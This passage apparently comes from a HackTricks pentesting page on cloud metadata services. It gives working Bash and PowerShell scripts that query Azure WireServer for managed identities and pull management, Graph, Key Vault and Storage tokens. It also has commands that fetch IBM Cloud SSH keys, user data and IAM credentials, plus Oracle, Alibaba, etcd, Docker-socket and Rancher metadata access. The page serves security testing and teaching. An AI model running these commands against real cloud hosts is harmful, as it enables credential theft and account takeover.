+Azure provides multiple ways to execute commands inside a VM, but **they do not run in the same context**.
+
+---
+
+##### Run Command
+
+Run Command is an Azure feature that executes scripts via the **VM Agent**.
+
+- Uses: `Microsoft.Compute/virtualMachines/runCommand/action`
+- Runs with **agent-level privileges**
+- Has access to:
+  - WireServer
+  - GoalState
+  - ExtensionsConfig
+
+Example:
+
+```bash
+az vm run-command invoke \
+  --resource-group <rsc-group> \
+  --name <vm-name> \
+  --command-id RunShellScript \
+  --scripts @script.sh
+```
+
+##### SSH Session
+
+When connecting via SSH:
+
+- Runs as a **regular OS user**
+- Uses standard network stack
+- Does **NOT have agent-level access**
+
+As a result:
+
+- Requests to `168.63.129.16` may fail or return incomplete data
+- GoalState may not be accessible
+
+**Script Examples to get attached managed identities:**
+
+{{#tabs }}
+{{#tab name="Linux" }}
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+
+ws="http://168.63.129.16"
+
+echo "[*] Getting Goal State..."
+
+goal_urls=(
+  "$ws/?comp=goalstate"
+  "$ws/machine?comp=goalstate"
+  "$ws/machine/?comp=goalstate"
+)
+
+goal_xml=""
+for url in "${goal_urls[@]}"; do
+  if goal_xml="$(curl -fsS -H "x-ms-version: 2012-11-30" "$url" 2>/dev/null)"; then
+    echo "[+] GoalState OK via $url"
+    break
+  fi
+done
+
+if [[ -z "$goal_xml" ]]; then
+  echo "[-] No GoalState endpoint responded"
+  exit 1
+fi
+
+ext_url="$(
+  GOAL_XML="$goal_xml" python3 - <<'PY'
+import os
+import xml.etree.ElementTree as ET
+
+xml = os.environ["GOAL_XML"].strip()
+root = ET.fromstring(xml)
+
+def lname(tag):
+    return tag.rsplit("}", 1)[-1]
+
+for el in root.iter():
+    if lname(el.tag) == "ExtensionsConfig" and (el.text or "").strip():
+        print(el.text.strip())
+        break
+PY
+)"
+
+if [[ -z "$ext_url" ]]; then
+  echo "[-] No ExtensionsConfig URL found in GoalState"
+  echo "[*] Identity-like nodes seen in GoalState:"
+  GOAL_XML="$goal_xml" python3 - <<'PY'
+import os
+import xml.etree.ElementTree as ET
+
+xml = os.environ["GOAL_XML"].strip()
+root = ET.fromstring(xml)
+
+def lname(tag):
+    return tag.rsplit("}", 1)[-1]
+
+found = False
+for el in root.iter():
+    name = lname(el.tag)
+    if "Identity" in name:
+        found = True
+        text = (el.text or "").strip()
+        print(f"<{name}>{text}</{name}>")
+
+if not found:
+    print("    (none)")
+PY
+  exit 0
+fi
+
+echo "[*] Getting ExtensionsConfig..."
+ext_xml="$(curl -fsS -H "x-ms-version: 2012-11-30" "$ext_url")"
+
+EXT_XML="$ext_xml" python3 - <<'PY'
+import os
+import xml.etree.ElementTree as ET
+
+xml = os.environ["EXT_XML"].strip()
+root = ET.fromstring(xml)
+
+def lname(tag):
+    return tag.rsplit("}", 1)[-1]
+
+ids = [el for el in root.iter() if lname(el.tag) == "UserAssignedIdentity"]
+
+if not ids:
+    print("[-] No UserAssignedIdentity nodes found")
+    print("[*] Identity-like nodes present in ExtensionsConfig:")
+    shown = False
+    for el in root.iter():
+        name = lname(el.tag)
+        if "Identity" in name:
+            shown = True
+            text = (el.text or "").strip()
+            attrs = " ".join(f'{k}="{v}"' for k, v in el.attrib.items())
+            if attrs:
+                print(f"    <{name} {attrs}>{text}</{name}>")
+            else:
+                print(f"    <{name}>{text}</{name}>")
+    if not shown:
+        print("    (none)")
+    raise SystemExit(0)
+
+for idnode in ids:
+    client_id = ""
+    object_id = ""
+    resource_id = ""
+
+    for child in idnode.iter():
+        name = lname(child.tag)
+        text = (child.text or "").strip()
+        if name == "IdentityClientId":
+            client_id = text
+        elif name == "IdentityObjectId":
+            object_id = text
+        elif name == "IdentityResourceId":
+            resource_id = text
+
+    print()
+    print("[+] Managed Identity:")
+    print(f"    ClientId   : {client_id}")
+    print(f"    ObjectId   : {object_id}")
+    print(f"    ResourceId : {resource_id}")
+PY
+```
+
+{{#endtab }}
+
+{{#tab name="Windows" }}
+
+```bash
+$ws = "http://168.63.129.16"
+$h  = @{
+    "x-ms-version" = "2012-11-30"
+}
+
+Write-Host "[*] Getting Goal State..." -ForegroundColor Cyan
+
+$goalUrls = @(
+    "$ws/?comp=goalstate",
+    "$ws/machine?comp=goalstate",
+    "$ws/machine/?comp=goalstate"
+)
+
+$gs = $null
+
+foreach ($url in $goalUrls) {
+    try {
+        $gs = Invoke-WebRequest -Uri $url -Headers $h -UseBasicParsing -ErrorAction Stop
+        Write-Host "[+] GoalState OK via $url" -ForegroundColor Green
+        break
+    } catch {}
+}
+
+if (-not $gs) {
+    Write-Host "[-] No GoalState endpoint responded" -ForegroundColor Red
+    return
+}
+
+[xml]$xml = $gs.Content
+$cfg = $xml.GoalState.Container.RoleInstanceList.RoleInstance.Configuration
+
+$extUrl = $cfg.ExtensionsConfig
+
+Write-Host "[*] Getting ExtensionsConfig..." -ForegroundColor Cyan
+
+try {
+    $ext = Invoke-WebRequest -Uri $extUrl -Headers $h -UseBasicParsing -ErrorAction Stop
+    [xml]$extXml = $ext.Content
+} catch {
+    Write-Host "[-] Error getting ExtensionsConfig" -ForegroundColor Red
+    return
+}
+
+# Extract Managed Identity info
+$ids = $extXml.SelectNodes("//UserAssignedIdentity")
+
+if (!$ids) {
+    Write-Host "[-] No User Assigned Identities found" -ForegroundColor Red
+    return
+}
+
+foreach ($id in $ids) {
+    $clientId   = $id.IdentityClientId
+    $objectId   = $id.IdentityObjectId
+    $resourceId = $id.IdentityResourceId
+
+    Write-Host "`n[+] Managed Identity:" -ForegroundColor Green
+    Write-Host "    ClientId   : $clientId"
+    Write-Host "    ObjectId   : $objectId"
+    Write-Host "    ResourceId : $resourceId"
+}
+```
+
+{{#endtab }}
+{{#endtabs }}
+
+
+
+
+### Azure App & Functions Services & Automation Accounts
+
+From the **env** you can get the values of **`IDENTITY_HEADER`** and **`IDENTITY_ENDPOINT`**. That you can use to gather a token to speak with the metadata server.
+
+Most of the time, you want a token for one of these resources:
+
+- [https://storage.azure.com](https://storage.azure.com/)
+- [https://vault.azure.net](https://vault.azure.net/)
+- [https://graph.microsoft.com](https://graph.microsoft.com/)
+- [https://management.azure.com](https://management.azure.com/)
+
+> [!CAUTION]
+> The same selector rule applies through an App Service or Functions identity endpoint: add `object_id`, `client_id`, or `msi_res_id` for a user-assigned identity, or omit them to request the default identity ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)).
+
+{{#tabs}}
+{{#tab name="Bash"}}
+
+```bash
+# Check for those env vars to know if you are in an Azure app
+echo $IDENTITY_HEADER
+echo $IDENTITY_ENDPOINT
+
+# (Fingerprint) You should also be able to find the folder:
+ls /opt/microsoft
+
+# Get management token
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+# Get graph token
+curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+# Get vault token
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+# Get storage token
+curl "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+```
+
+{{#endtab}}
+
+{{#tab name="PS"}}
+
+```bash
+# Define the API version
+$API_VERSION = "2019-08-01"
+
+# Function to get a token for a specified resource
+function Get-Token {
+    param (
+        [string]$Resource
+    )
+    $url = "$IDENTITY_ENDPOINT?resource=$Resource&api-version=$API_VERSION"
+    $headers = @{
+        "X-IDENTITY-HEADER" = $IDENTITY_HEADER
+    }
+    try {
+        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
+        $response.access_token
+    } catch {
+        Write-Error "Error obtaining token for $Resource: $_"
+    }
+}
+
+# Get Management Token
+$managementToken = Get-Token -Resource "https://management.azure.com/"
+Write-Host "Management Token: $managementToken"
+
+# Get Graph Token
+$graphToken = Get-Token -Resource "https://graph.microsoft.com/"
+Write-Host "Graph Token: $graphToken"
+
+# Get Vault Token
+$vaultToken = Get-Token -Resource "https://vault.azure.net/"
+Write-Host "Vault Token: $vaultToken"
+
+# Get Storage Token
+$storageToken = Get-Token -Resource "https://storage.azure.com/"
+Write-Host "Storage Token: $storageToken"
+
+
+# Using one-liners
+
+## Get management token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Get graph token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Get vault token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://vault.azure.net/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Get storage token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Remember that in Automation Accounts it might be declared the client ID of the assigned user managed identity inside the variable that can be gatehred with:
+Get-AutomationVariable -Name 'AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID'
+```
+
+{{#endtab}}
+{{#endtabs}}
+
+## IBM Cloud
+
+> [!WARNING]
+> Note that in IBM by default metadata is not enabled, so it's possible that you won't be able to access it even if you are inside an IBM cloud VM
+
+```bash
+export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
+  -H "Metadata-Flavor: ibm"\
+  -H "Accept: application/json"\
+  -d '{
+        "expires_in": 3600
+      }' | jq -r '(.access_token)'`
+
+# Get instance details
+curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq
+
+# Get SSH keys info
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq
+
+# Get SSH keys fingerprints & user data
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq
+
+# Get placement groups
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq
+
+# Get IAM credentials
+curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
+```
+
+Documentation for various platforms' metadata services is outlined below, highlighting the methods through which configuration and runtime information for instances can be accessed. Each platform offers unique endpoints to access its metadata services.
+
+## Packetcloud
+
+For accessing Packetcloud's metadata, the documentation can be found at: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)
+
+## OpenStack/RackSpace
+
+The necessity for a header is not mentioned. Metadata can be accessed through:
+
+- `http://169.254.169.254/openstack`
+
+## HP Helion
+
+The necessity for a header is not mentioned here either. Metadata is accessible at:
+
+- `http://169.254.169.254/2009-04-04/meta-data/`
+
+## Oracle Cloud
+
+Oracle Cloud Infrastructure has an **IMDSv2** mode that is much more relevant today than the legacy `/latest/` examples.<sup>[[2]](#references)</sup> In IMDSv2:
+
+- Requests go to `http://169.254.169.254/opc/v2/`
+- Requests must include the header `Authorization: Bearer Oracle`
+- Requests carrying `Forwarded`, `X-Forwarded-For`, or `X-Forwarded-Host` are rejected
+- If the instance is configured to only allow IMDSv2, the old `/opc/v1` and `/openstack` paths return `404`
+
+Interesting endpoints:
+
+```bash
+curl -s -H "Authorization: Bearer Oracle" \
+  http://169.254.169.254/opc/v2/instance/
+
+curl -s -H "Authorization: Bearer Oracle" \
+  http://169.254.169.254/opc/v2/vnics/
+```
+
+So, from an SSRF perspective, OCI now behaves much closer to the hardened cloud metadata services that require a **mandatory header** and explicitly reject common **forwarded-header proxy patterns**.
+
+## Alibaba
+
+Alibaba offers endpoints for accessing metadata, including instance and image IDs:
+
+- `http://100.100.100.200/latest/meta-data/`
+- `http://100.100.100.200/latest/meta-data/instance-id`
+- `http://100.100.100.200/latest/meta-data/image-id`
+
+## Kubernetes ETCD
+
+Kubernetes ETCD can hold API keys, internal IP addresses, and ports. Access is demonstrated through:
+
+- `curl -L http://127.0.0.1:2379/version`
+- `curl http://127.0.0.1:2379/v2/keys/?recursive=true`
+
+## Docker
+
+Docker metadata can be accessed locally, with examples given for container and image information retrieval:
+
+- Simple example to access containers and images metadata via the Docker socket:
+  - `docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash`
+  - Inside the container, use curl with the Docker socket:
+    - `curl --unix-socket /var/run/docker.sock http://foo/containers/json`
+    - `curl --unix-socket /var/run/docker.sock http://foo/images/json`
+
+## Rancher
+
+Rancher's metadata can be accessed using:
+
+- `curl http://rancher-metadata/<version>/<path>`
+
+
+
+## References
+
+- [1] [AWS SDKs and Tools Reference Guide - Container credential provider](https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html)
+- [2] [Oracle Cloud Infrastructure - Instance Metadata Service v2](https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm)
+
+{{#include ../../banners/hacktricks-training.md}}
